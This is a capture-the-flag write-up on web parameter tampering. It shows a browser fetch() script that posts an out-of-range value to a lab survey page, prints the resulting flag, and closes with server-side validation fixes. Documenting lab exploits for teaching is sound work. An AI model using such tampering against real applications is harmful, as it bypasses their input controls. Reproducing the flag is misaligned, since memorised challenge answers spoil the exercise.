# isWeb Parameter Tampering - Survey Breach

## 📝 Description

This breach occurs when a web application trusts user-provided data without performing proper server-side validation. In this case, the survey page allows a user to vote for a subject, but the frontend restricts the values to a range of 1–10.

## 🕵️‍♂️ Exploitation Process

### 1. Enumeration & Observation

- I navigated to the survey page and observed a voting system.
- By inspecting the network traffic in **Brave DevTools** , I saw that choosing a value sends a `POST` request to `/?page=survey`.
- The payload contains two parameters: `sujet` (the ID of the person) and `valeur` (the grade).

### 2. The Attack (Parameter Manipulation)

The HTML `<select>` tag limits the `valeur` to a maximum of 10. To bypass this, I used the **Brave Browser Console** to send a manual `fetch` request with an out-of-range value (`42`).

**Exploit Script:**

**JavaScript**

```
fetch("http://192.168.64.2/?page=survey", {
  "method": "POST",
  "headers": {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  "body": "sujet=42&valeur=42"
})
.then(response => response.text())
.then(html => {
    document.open();
    document.write(html);
    document.close();
});
```

### 3. Result

By sending a value that the frontend could not produce, the backend server became "confused" and returned the hidden flag.

**Flag:** `03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa 
`
[Click for more information (OWASP)](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)
[Click for more information (imperva blog post)](https://www.imperva.com/learn/application-security/parameter-tampering/)

---

## 🛠️ How to Fix

To prevent this vulnerability, developers must implement **Server-Side Validation** .

- **Never trust the client** : Always assume the user can modify the request.
- **Validate input** : On the backend (e.g., in NestJS or PHP), check if the `valeur` is between 1 and 10 before saving it to the database.
- **Sanitize data** : Ensure the `sujet` ID exists in the database.
